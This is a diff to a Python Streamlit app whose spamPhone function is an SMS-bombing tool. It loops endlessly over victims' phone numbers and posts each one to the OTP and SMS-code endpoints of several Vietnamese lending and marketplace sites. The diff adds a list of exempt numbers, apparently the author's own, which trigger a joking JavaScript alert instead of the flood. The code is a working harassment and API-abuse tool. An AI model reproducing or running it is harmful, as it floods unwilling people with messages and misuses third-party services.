@@ -59,43 +59,40 @@ class App:
         st.markdown(css, unsafe_allow_html=True)
     def javaScript(self):
         script = '''
-        <textarea style="border: 1px solid black; outline:none" id="messagebox" rows="10" cols="40">
-        </textarea>
-        '''
-        st.markdown(script, unsafe_allow_html=True)
-        sleep(1)
-        a = '''
         <script language="javascript">
-            var mess = document.getElementById("messagebox");
-            console.log(mess)
+            alert("hong được đâu pé ơi !!! :)))")
         </script>
         '''
-        components.html(a)
-        st.markdown(a, unsafe_allow_html=True)
+        components.html(script)
+        st.markdown(script, unsafe_allow_html=True)
     def spamPhone(self,arrPhone):
         sdt = arrPhone.split(",")
         i=0
         while True:
             try:
                 phone = sdt[i]
-                pload = {"mobilePhone":phone,"password":"R2mpP2.EdLS#i5","passwordConfirmation":"R2mpP2.EdLS#i5","isVoiceSms":True}
-                requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode",json=pload)
-                pload = {"name":"Tu Le Dang","phoneNumber":phone}
-                requests.post("https://webvay.vn/po/api/signup/sendOtp",json = pload)
-                pload = {"mobile":phone}
-                requests.post("https://api.magpiecredit.com/user/sendCode-h5",data = pload)
-                pload = {"phoneNumber": phone}
-                requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/",data=pload)
-                pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":"","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"201","appName":"Vay Tia Chớp","packageName":"com.firstvay.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634575899216","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"Ie9ja"}}
-                requests.post("https://api.first-vay.com/pdl-abroad-main/app/member/sendSmsCode",json=pload)
-                pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":None,"appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"0000","appName":"Vi May Man","packageName":"com.vimaymanvn.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634576326968","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"3Wr7a"}}
-                requests.post("https://api.vmayman.com/app/member/sendSmsCode",json=pload)
-                pload = {"mobile": phone}
-                requests.post("https://wenvey.com/_api/auth/login/sms",data=pload)
-                pload = {"phone":phone}
-                requests.post("https://gateway.chotot.com/v2/public/auth/send_otp_verify",json=pload)
-                pload = {"mobile": phone}
-                requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)
+                nono = ['0345382198','345382198','+84345382198','0964017787','964017787','+84964017787']
+                if phone not in nono:
+                    pload = {"mobilePhone":phone,"password":"R2mpP2.EdLS#i5","passwordConfirmation":"R2mpP2.EdLS#i5","isVoiceSms":True}
+                    requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode",json=pload)
+                    pload = {"name":"Tu Le Dang","phoneNumber":phone}
+                    requests.post("https://webvay.vn/po/api/signup/sendOtp",json = pload)
+                    pload = {"mobile":phone}
+                    requests.post("https://api.magpiecredit.com/user/sendCode-h5",data = pload)
+                    pload = {"phoneNumber": phone}
+                    requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/",data=pload)
+                    pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":"","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"201","appName":"Vay Tia Chớp","packageName":"com.firstvay.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634575899216","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"Ie9ja"}}
+                    requests.post("https://api.first-vay.com/pdl-abroad-main/app/member/sendSmsCode",json=pload)
+                    pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":None,"appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"0000","appName":"Vi May Man","packageName":"com.vimaymanvn.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634576326968","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"3Wr7a"}}
+                    requests.post("https://api.vmayman.com/app/member/sendSmsCode",json=pload)
+                    pload = {"mobile": phone}
+                    requests.post("https://wenvey.com/_api/auth/login/sms",data=pload)
+                    pload = {"phone":phone}
+                    requests.post("https://gateway.chotot.com/v2/public/auth/send_otp_verify",json=pload)
+                    pload = {"mobile": phone}
+                    requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)
+                else:
+                    self.javaScript()
                 i+=1
                 if i==len(sdt):
                     i=0
